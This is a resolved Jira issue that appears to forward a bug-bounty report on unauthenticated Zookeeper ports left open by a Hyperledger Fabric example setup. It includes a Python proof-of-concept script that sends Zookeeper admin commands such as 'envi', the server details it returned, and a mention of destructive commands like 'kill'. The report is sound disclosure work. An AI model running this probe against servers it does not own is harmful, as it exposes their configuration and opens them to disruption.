<Issue id="34727" key="FAB-12496" number="12496" project="10002" reporter="dhuseby" assignee="kchristidis" creator="dhuseby" type="10004" summary="Unauthorized access to Zookeeper" priority="3" resolution="10000" status="6" created="2018-10-16 23:20:50.0" updated="2018-12-05 18:13:01.0" resolutiondate="2018-12-05 18:12:07.0" votes="0" watches="4" workflowId="46136" security="10000"> <description><! CDATA This came in from H1: h2. test environment  ubuntu16 vm(192.168.174.131) fabric-release-1.3 e2e_cli example h2. poc  After successful installation of e2e_cli example, I notice 32781/tcp, 32783/tcp, 32784/tcp, 32785/tcp, 32786/tcp 32788/tcp, 32789/tcp, 32790/tcp, 32791/tcp, 32792/tcp, 32793/tcp is open to internet. I remember e2e_cli uses kafka and zookeeper, and guess that there is probably unauthorized access to zookeeper. So I write a simple script to prove it. Â   {code:python} #!/usr/bin/env python # -*- coding: utf-8 -*-  import socket  def check(ip, port, timeout): try: socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) flag = "envi" # some available command # envi # dump # reqs # ruok # stat s.send(flag) data = s.recv(1024) s.close() print(data) except: pass  def main(): ip = "192.168.174.131" print check(ip, 32783, 2)  if __name__ == '__main__': main() {code}   Here I use 32783 port, the number differs in different environment, the response proves my guess  {noformat} Environment: zookeeper.version=3.4.9-1757313, built on 08/23/2016 06:50 GMT host.name=7217cc4308fa java.version=1.8.0_181 java.vendor=Oracle Corporation java.home=/usr/lib/jvm/java-8-openjdk-amd64/jre java.class.path=/zookeeper-3.4.9/bin/../build/classes:/zookeeper-3.4.9/bin/../build/lib/*.jar:/zookeeper-3.4.9/bin/../lib/slf4j-log4j12-1.6.1.jar:/zookeeper-3.4.9/bin/../lib/slf4j-api-1.6.1.jar:/zookeeper-3.4.9/bin/../lib/netty-3.10.5.Final.jar:/zookeeper-3.4.9/bin/../lib/log4j-1.2.16.jar:/zookeeper-3.4.9/bin/../lib/jline-0.9.94.jar:/zookeeper-3.4.9/bin/../zookeeper-3.4.9.jar:/zookeeper-3.4.9/bin/../src/java/lib/*.jar:/conf: java.library.path=/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib java.io.tmpdir=/tmp java.compiler=<NA> os.name=Linux os.arch=amd64 os.version=4.15.0-36-generic user.name=zookeeper user.home=/home/zookeeper user.dir=/zookeeper-3.4.9 {noformat}     please don't open it to internet and add acl. h2. Impact  Attacker is able to gain priviledge of zookeeper administrator which includes sensitive information of server and by zkCli.sh even do some dangerous operation include "kill" command  ></description> </Issue>
